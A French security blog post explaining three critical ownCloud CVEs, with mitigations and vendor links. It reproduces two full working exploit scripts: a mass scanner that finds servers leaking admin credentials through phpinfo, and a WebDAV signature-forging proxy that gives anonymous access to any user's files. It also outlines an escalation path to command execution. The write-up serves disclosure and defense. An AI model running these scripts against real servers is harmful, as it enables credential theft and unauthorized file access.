---
title: "Pwncloud : votre propre cloud (non) sécurisé"
description: "OwnCloud est un logiciel libre offrant une plateforme de services de stockage et partage de fichiers et d'applications diverses en ligne. Il est présenté comme une alternative à Dropbox, lequel est basé sur un cloud public. Or, comme tous les logiciels il souffre de vulnérabilité."
date: 2023-12-08T15:05:00+01:00
draft: false
images: [/images/pwncloud/pwncloud.png]
featuredImage: "/images/pwncloud/pwncloud.png"
featuredImagePreview: "/images/pwncloud/pwncloud.png"
tags: ["Pwncloud", "Pentest", "Cloud"]
---

# ☁️ Pwncloud : votre propre cloud (non) sécurisé

## 1, 2 et 3 vulnérabilités critiques 

OwnCloud est un logiciel libre offrant une plateforme de services de stockage et partage de fichiers et d'applications diverses en ligne. Il est présenté comme une alternative à Dropbox, lequel est basé sur un cloud public.

Fin novembre 2023, OwnCloud publiait 3 articles concernant 3 vulnérabilités critiques :

- **La CVE-2023-49103** :
   - Score CVSS de 10 ! 😱
   - Divulgation d'informations d'identification et de configuration sensibles dans des déploiements conteneurisés.
   - https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/

- **La CVE-2023-49105** : 
   - Score CVSS de 9.8 😨
   - Lecture et écriture de fichiers via un contournement de l'authentification de l'Api WebDAV.
   - https://owncloud.com/security-advisories/webdav-api-authentication-bypass-using-pre-signed-urls/

- **La CVE-2023-49104** :
   - Score CVSS de 9.0
   - Contournement de la validation de sous-domaine impactant oauth2.
   - https://owncloud.com/security-advisories/subdomain-validation-bypass/

## CVE-2023-49103

![CVE-2023-49103](/images/pwncloud/2023-12-11_16-10.png)

La CVE-2023-49103 est surement la vulnérabilité la plus facilement exploitable des trois. Mais pas forcément la plus sévère !

### En bref

Quelques explications pour rapidement comprendre la vulnérabilité :

- L'application "graphapi" s'appuie sur une bibliothèque tierce vulnérable (graphapi 0.2.0 – 0.3.0).
- Cette bibliothèque divulgue les détails de configuration de l'environnement PHP (phpinfo) 🤣
- On y retrouve des données sensibles telles que le mot de passe de l'administrateur d'ownCloud, le serveur de messagerie, etc.

### A retenir

- Désactiver l'application graphapi n'élimine pas la vulnérabilité (ça serait trop simple sinon 😂)
- Affecte aussi les environnements non conteneurisés.
- Les conteneurs Docker datant d'avant février 2023 ne sont pas vulnérables.

### Les protections

Comment se protéger de cette vulnérabilité ? Il existe plusieurs méthodes : 

1. Supprimer le fichier `owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php`.
2. Désactiver la fonction `phpinfo` si possible.
3. Modifier les secrets suivants
   - Mot de passe administrateur ownCloud
   - Identifiants du serveur de messagerie
   - Identifiants de la base de données
   - Clé d'accès au magasin d'objets/S3

### PoC

Un PoC est disponible pour détecter la présence du fichier GetPhpInfo.php : https://github.com/creacitysec/CVE-2023-49103/blob/main/exploit.py

```py
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import argparse
import queue
from alive_progress import alive_bar

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_phpinfo(url):
    try:
        response = requests.get(url, verify=False)  # Bypass SSL verification
        if response.status_code == 200 and 'OWNCLOUD_ADMIN_' in response.text:
            return True
    except requests.RequestException:
        pass
    return False

def process_urls(url_queue, output_file, update_bar):
    with open(output_file, 'a') as out:
        while True:
            url = url_queue.get()
            if url is None:
                url_queue.task_done()
                break  # Sentinel value to indicate completion
            try:
                if check_phpinfo(url):
                    print(Fore.GREEN + "Valid: " + url + Style.RESET_ALL)
                    out.write(url + '\n')
                else:
                    print(Fore.RED + "Invalid: " + url + Style.RESET_ALL)
            except Exception as e:
                print(Fore.YELLOW + f"Error processing {url}: {e}" + Style.RESET_ALL)
            finally:
                url_queue.task_done()
                update_bar()  # Update the progress bar

def process_file(file_path, output_file):
    urls = []
    with open(file_path, 'r') as file:
        for line in file:
            base_url = line.strip()
            # Append both URL variants for each base URL
            urls.append(base_url + "/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css")
            urls.append(base_url + "/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css")

    url_queue = queue.Queue()
    num_workers = min(100, len(urls))  # Adjust based on your system's capabilities

    with alive_bar(len(urls), bar='smooth', enrich_print=False) as bar:
        with ThreadPoolExecutor(max_workers=num_workers) as executor:
            # Start worker threads
            for _ in range(num_workers):
                executor.submit(process_urls, url_queue, output_file, bar)

            # Read URLs and add them to the queue
            for url in urls:
                url_queue.put(url)

            # Add sentinel values to indicate completion
            for _ in range(num_workers):
                url_queue.put(None)

            url_queue.join()  # Wait for all tasks to be completed


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Process some URLs.')
    parser.add_argument('-t', '--target', required=True, help='Input file with URLs')
    parser.add_argument('-o', '--output', required=True, help='Output file for valid URLs')

    args = parser.parse_args()

    process_file(args.target, args.output)
```

### Schéma

Ci-dessous un schéma récapitulatif de l'attaque :

![Alt text](/images/pwncloud/CVE-2023-49103.gif)

## CVE-2023-49105

![CVE-2023-49105](/images/pwncloud/2023-12-11_16-11.png)

Quelques rappels concernant la vulnérabilité CVE-2023-49105 :
   - Le score CVSS est de 9.8 😨.
   - Il est possible de lire, écrire et supprimer des fichiers en contournant l'authentification de l'Api WebDAV.

Ambionics a sorti un très bon article sur ce sujet : https://www.ambionics.io/blog/owncloud-cve-2023-49103-cve-2023-49105

### En bref

En résumé, il existe 2 scénarios d'exploitation possibles : 

1. **Scénario anonyme** : récupérer tous les fichiers de n'importe quel compte en étant anonyme.
2. **Scénario authentifié** : élever ses privilèges de simple utilisateur en tant qu'administrateur afin d'exécuter des commandes.


👇 Un PoC est disponible sur [GitHub](https://github.com/ambionics/owncloud-exploits/blob/main/pwncloud-webdav.py) et juste en dessous

```python
#!/usr/bin/env python3
# Owncloud Privilege Escalation CVE-2023-49105 pwnCloud
# 2023-12-05
# cfreal
#
# DESCRIPTION
#
# Exploit demonstrating a consequence of CVE-2023-49105: arbitrary access to WEBDAV
# resources, including every file stored by a user.
#
# EXAMPLE
#
# $ ./pwncloud-webdav.py http://target.com/ admin
#
# REQUIREMENTS
#
# requires ten (https://github.com/cfreal/ten)
#

import hashlib
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

from ten import *
from tenlib.transform import url as turl


@entry
def main(url: str, username: str, listen: str = "localhost:8800") -> None:
    # Setup ProxyHandler
    ProxyHandler.session = ScopedSession(url)
    # ProxyHandler.session.burp()
    ProxyHandler.username = username

    # Display info
    msg_success(f"Proxy server running on {listen}")

    dav_url = f"dav://anonymous@{listen}/remote.php/dav"

    msg_info(f"Browse user files: {dav_url}/files/{username}")
    msg_info(f"Browse everything: {dav_url}")

    # Setup HTTP server
    listen_host, listen_port = listen.split(":")
    listen_port = int(listen_port)

    proxy_server = ThreadingHTTPServer((listen_host, listen_port), ProxyHandler)

    try:
        proxy_server.serve_forever()
    except KeyboardInterrupt:
        msg_failure("Shutting down the proxy server.")
        proxy_server.server_close()


class ProxyHandler(SimpleHTTPRequestHandler):
    session = ScopedSession
    username: str

    def do_ANY(self):
        # Fix bug where ownCloud does not realize /remote.php/dav is equal to
        # /remote.php/dav/ and raises an error
        if self.path == "/remote.php/dav":
            self.path += "/"

        # Add OC-* and signature to the URL
        url = build_signed_url(
            self.command, self.username, self.session.get_absolute_url(self.path)
        )

        # Prepare headers
        headers = {header: self.headers[header] for header in self.headers}
        headers["Host"] = turl.parse(url).netloc

        # TODO stream input
        if size := int(self.headers.get("Content-Length", 0)):
            data = self.rfile.read(size)
        else:
            data = None

        response = self.session.request(
            self.command, url, headers=headers, data=data, stream=True
        )

        self.send_response(response.status_code)

        for header, value in response.headers.items():
            self.send_header(header, value)

        self.end_headers()

        # Stream the response content to the client
        for chunk in response.iter_content(chunk_size=8192):
            if chunk:
                self.wfile.write(chunk)

    do_OPTIONS = do_ANY
    do_GET = do_ANY
    do_HEAD = do_ANY
    do_POST = do_ANY
    do_PUT = do_ANY
    do_DELETE = do_ANY
    do_TRACE = do_ANY
    do_COPY = do_ANY
    do_LOCK = do_ANY
    do_MKCOL = do_ANY
    do_MOVE = do_ANY
    do_PROPFIND = do_ANY
    do_PROPPATCH = do_ANY
    do_UNLOCK = do_ANY


def compute_hash(url: str) -> str:
    url = url.encode()
    signing_key = "".encode()
    iterations = 10000
    return hashlib.pbkdf2_hmac("sha512", url, signing_key, iterations, dklen=32).hex()


def build_signed_url(method: str, username: str, url: str) -> str:
    parsed = turl.parse(url)
    params = qs.parse(parsed.query)
    params["OC-Credential"] = username
    params["OC-Verb"] = method
    params["OC-Expires"] = "1000"
    params["OC-Date"] = ""
    parsed = parsed._replace(query=qs.unparse(params))
    params["OC-Signature"] = compute_hash(turl.unparse(parsed))
    parsed = parsed._replace(query=qs.unparse(params))
    return turl.unparse(parsed)


main()
```

<br>

### Etude du scénario le plus probable : scénario anonyme

Le scénario le plus probable de se produire est celui **anonyme**. Il est aussi le plus simple à expliquer et à exploiter contrairement au second.

Les grandes lignes de l'attaque :

1. L'attaquant accéde au service `WebDAV` présent sur `/remote.php/dav`. `WebDAV` est une extension de `HTTP` et permet de simplifier la gestion de fichiers avec des serveurs distants.
2. OwnCloud autorise l'authentification à partir d'un username et d'une clef de signature.
3. Par défaut, la clef définie est **VIDE** (!!!) 😱
4. L'attaquant usurpe l'identité de n'importe quel utilisateur juste en connaissant le nom d'utilisateur.
5. L'attaquant accède au `WebDAV` et consulte/modifie/supprime n'importe quel fichier 😭

### Etude du scénario le moins probable : scénario authentifié

Ce scénario est moins probable car il nécessite un **compte authentifié**. Il est plus complexe à mettre en place et permet une exécution de commande. Comme vu précédemment, il est possible d'utiliser la signature vide de n'importe quel utilisateur. Or, il est impossible d'accéder aux fonctionnalités de l'utilisateur et de l'administrateur avec. Un contournement est alors possible !

Dans les grandes lignes :

1. L'attaquant s'authentifie en tant que simple utilisateur.
2. L'attaquant rajoute un entête Authorization invalide à ses requêtes. Exemple : Authorization: token thisisnotavalidtoken
3. L'attaquant s'authentifie avec un username usurpé et sa clef de signature.
4. L'attaquant change la valeur user_id par admin pour monter en privilège (oui je sais sans le code sous les yeux ce n'est pas clair)
5. Un administrateur OwnCloud possède des fonctionnalités pour exécuter des commandes.

👇 Ci-dessous, une vidéo réalisée par Charles Fol, le rédacteur de l'article concernant le scénario anonyme. Patchez vos instances !

<video src="/images/pwncloud/exploit-privilege-escalation.mp4" controls autoplay loop title="Exploitation WebDav OwnCloud" style="width:100%"></video>

## CVE-2023-49104

![Alt text](/images/pwncloud/2023-12-11_16-13.png)

Selon OwnCloud, un attaquant est capable de contourner le code de validation oAuth2 via une URL particulière. Une étude est actuellement en cours sur cette vulnérabilité et des explications devront venir dans les jours à venir.

## Sources

- https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/
- https://www.greynoise.io/blog/cve-2023-49103-owncloud-critical-vulnerability-quickly-exploited-in-the-wild
- https://www.ambionics.io/blog/owncloud-cve-2023-49103-cve-2023-49105